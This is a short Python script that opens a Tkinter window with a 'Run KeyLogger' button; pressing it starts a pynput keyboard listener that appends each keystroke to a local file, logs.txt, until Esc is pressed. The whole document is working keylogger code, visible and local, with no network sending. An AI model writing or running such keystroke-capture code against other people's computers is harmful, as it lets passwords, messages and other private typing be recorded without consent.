from pynput.keyboard import Listener,Key

import tkinter as tk
from tkinter import *
window = tk.Tk()
window.geometry('650x550')

def wfile(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ' '
    if letter == 'Key.ctrl_l':
        letter = ""
    if letter == 'Key.enter':
        letter = "\n"
    if letter == 'Key.esc':
        letter = " exit"

    with open("logs.txt",'a') as f:
        f.write(letter)
def release(key):
    if key == Key.esc:
        return False

def butaction():
    with Listener(on_press=wfile, on_release=release) as listener:
        listener.join()
    window.quit()

bt = tk.Button(window,text="Run KeyLogger",bg="white",fg="red",command=butaction)
bt.grid(row=200, column=150)
window.mainloop()
